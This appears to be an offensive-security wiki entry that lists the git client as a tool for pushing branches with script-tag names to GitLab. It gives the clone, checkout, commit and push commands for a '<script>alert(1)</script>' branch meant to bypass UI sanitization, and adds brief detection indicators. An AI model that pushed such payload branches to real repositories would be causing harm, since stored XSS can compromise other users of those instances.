---
id: tool-git-client
url: 'https://git-scm.com/'
tags:
  - git
  - branch-creation
  - bypass
type: tool
verified: false
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:20.758Z'
validated: true
submitted: true
---
# Git-Client

**Status**: Unverified

## Overview

The Git client is a distributed version control system tool used to create and push branches with malicious names, bypassing potential UI sanitization in GitLab for XSS payloads.

## Description

Git allows arbitrary branch names, including HTML/JS, via command line. Clone a repo, create a branch like `<script>alert(1)</script>`, and push to remote. Alternative to UI for exploitation when web protections block payloads.

## Features

- Feature 1: Arbitrary branch naming.
- Feature 2: Local/offline operations.
- Feature 3: Push to remotes like GitLab.

## Installation

### Requirements

- Standard OS package manager.

### Install Commands

```bash
# Linux/macOS
sudo apt install git  # or brew install git
```

## Basic Usage

```bash
git --version
```

### Common Options

| Option | Description |
|--------|-------------|
| `-b` | Create branch |
| `push` | Upload to remote |

## Examples

### Example 1: Basic Usage

```bash
git clone <repo-url>
cd repo
git checkout -b new-branch
```

### Example 2: Advanced Usage

```bash
git checkout -b '<script>alert(1)</script>'
git commit --allow-empty -m "test"
git push origin '<script>alert(1)</script>'
```

## Expected Output

Branch created and pushed; remote accepts payload name.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[JavaScript]] JavaScript (via payload)

### Tactics

- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Git push logs with suspicious branch names.
- Network traffic to GitLab with encoded payloads.

## Related Procedures


## Related Tools

- [[tools/GDK-GitLab-Development-Kit]]

## References

- Official site: https://git-scm.com/
- Branch naming docs: Git manual
